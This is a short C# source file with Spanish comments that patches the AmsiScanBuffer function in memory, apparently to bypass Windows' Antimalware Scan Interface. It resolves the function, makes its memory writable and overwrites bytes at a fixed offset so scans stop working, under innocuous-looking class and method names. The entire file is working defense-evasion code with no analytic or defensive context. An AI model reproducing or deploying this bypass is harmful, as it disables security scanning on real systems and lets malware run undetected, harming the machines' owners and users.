using System;
using System.Runtime.InteropServices;

namespace Mejor {
    public class Atun {
        // Importar funciones de la API de Windows
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        private static extern void MoveMemory(IntPtr dest, IntPtr src, int size);

        public static void Natural() {
            // Obtener el puntero para la DLL amsi.dll
            IntPtr amsiDllPtr = LoadLibrary("amsi.dll");
            if (amsiDllPtr == IntPtr.Zero) {
                Console.WriteLine("ERROR: ¡No se pudo obtener el puntero de amsi.dll!");
                return;
            }

            // Obtener el puntero para la función AmsiScanBuffer
            IntPtr amsiScanBufferPtr = GetProcAddress(amsiDllPtr, "AmsiScanBuffer");
            if (amsiScanBufferPtr == IntPtr.Zero) {
                Console.WriteLine("ERROR: ¡No se pudo obtener el puntero de la función AmsiScanBuffer!");
                return;
            }

            // Cambiar la protección de memoria de la función AmsiScanBuffer para permitir escritura
            UIntPtr size = (UIntPtr)3; // Tamaño del parche en bytes
            if (!VirtualProtect(amsiScanBufferPtr, size, 0x40 /* PAGE_EXECUTE_READWRITE */, out _)) {
                Console.WriteLine("ERROR: ¡No se pudieron modificar los permisos de memoria de la función AmsiScanBuffer!");
                return;
            }

            // Código de parche: xor edi, edi; nop (0x31 0xFF 0x90)
            byte[] patch = { 0x31, 0xFF, 0x90 };

            // Asignar memoria no administrada para almacenar el parche
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(patch.Length);
            Marshal.Copy(patch, 0, unmanagedPointer, patch.Length);

            // Aplicar el parche en la dirección correspondiente de AmsiScanBuffer
            MoveMemory(amsiScanBufferPtr + 0x001b, unmanagedPointer, patch.Length);

            // Liberar la memoria no administrada
            Marshal.FreeHGlobal(unmanagedPointer);

            Console.WriteLine("AmsiScanBuffer parcheado con éxito.");
            return;
        }
    }
}
